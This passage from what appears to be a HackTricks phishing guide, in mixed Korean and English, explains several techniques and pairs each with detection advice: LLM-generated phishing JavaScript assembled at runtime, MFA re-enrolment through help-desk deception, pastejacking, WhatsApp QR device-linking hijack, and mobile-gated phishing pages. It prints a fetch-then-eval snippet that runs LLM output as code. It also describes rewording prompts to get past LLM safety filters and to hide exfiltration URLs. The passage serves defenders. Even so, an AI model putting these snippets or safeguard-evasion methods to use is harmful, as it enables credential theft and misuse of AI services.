## LLM 지원 phishing JavaScript의 runtime assembly (in-browser codegen)

Attackers는 benign-looking HTML을 전달하고 **trusted LLM API**에 JavaScript를 요청한 다음, 이를 browser에서 실행하여 **runtime에 stealer를 generate**할 수 있습니다(예: `eval` 또는 dynamic `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** prompt에 exfil URL/Base64 string을 encode하고, safety filter를 우회하며 hallucination을 줄이기 위해 wording을 반복해서 수정합니다.
2. **Client-side API call:** load 시 JS가 public LLM(Gemini/DeepSeek 등) 또는 CDN proxy를 호출합니다. Static HTML에는 prompt/API call만 존재합니다.
3. **Assemble & exec:** response를 concatenate한 뒤 실행합니다(visit마다 polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – 강제 재설정
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **동일한 IP에서 수 분 이내에** 발생하는지 확인합니다.



## Clipboard Hijacking / Pastejacking

공격자는 침해되었거나 typosquatting된 웹 페이지에서 악성 명령을 피해자의 clipboard에 몰래 복사한 다음, 사용자가 이를 **Win + R**, **Win + X** 또는 terminal 창 안에 붙여넣도록 유도할 수 있습니다. 이를 통해 download나 attachment 없이 임의의 code를 실행할 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* 유인 페이지(예: 가짜 정부 부처/CERT “channel”)에 WhatsApp Web/Desktop QR을 표시하고 피해자에게 이를 scan하도록 안내하여, 공격자를 **linked device**로 몰래 추가합니다.<sup>[[10]](#references)</sup>
* 공격자는 session이 제거될 때까지 즉시 chat/contact visibility를 확보합니다. 피해자는 나중에 “new device linked” notification을 볼 수 있으며, defenders는 신뢰할 수 없는 QR 페이지 방문 직후 발생한 예기치 않은 device-link event를 hunt할 수 있습니다.

### Mobile‑gated phishing to evade crawlers/sandboxes
운영자는 desktop crawler가 최종 페이지에 도달하지 못하도록 간단한 device check 뒤에 phishing flow를 숨기는 경우가 늘고 있습니다. 일반적인 패턴은 touch-capable DOM을 테스트하고 그 결과를 server endpoint로 post하는 작은 script를 사용하는 것입니다. non‑mobile client에는 HTTP 500(또는 빈 페이지)이 반환되고, mobile user에게는 전체 flow가 제공됩니다.<sup>[[6]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 로직(간소화):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
서버에서 자주 관찰되는 동작:
- 첫 번째 로드 중 session cookie를 설정합니다.
- `POST /detect {"is_mobile":true|false}`를 허용합니다.
- 이후 `GET` 요청에서 `is_mobile=false`이면 500(또는 placeholder)을 반환하고, `true`인 경우에만 phishing을 제공합니다.

탐색 및 탐지 휴리스틱:
- urlscan 쿼리: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non-mobile에 대한 HTTP 500 순서; 정상적인 mobile victim 경로는 후속 HTML/JS와 함께 200을 반환합니다.
- `ontouchstart` 또는 이와 유사한 device check에만 콘텐츠를 조건부로 제공하는 페이지를 차단하거나 면밀히 조사합니다.

방어 팁:
- crawler를 mobile과 유사한 fingerprint 및 JS 활성화 상태로 실행하여 gated content를 확인합니다.
- 새로 등록된 domain에서 `POST /detect` 이후 의심스러운 500 응답이 발생하면 alert를 생성합니다.

## References

- [1] [Generating Domain Variations Used in Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Finding Phishing: Tools and Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [How To Install and Configure DKIM with Postfix on Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Hijacking traffic to Microsoft's windows.com with bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
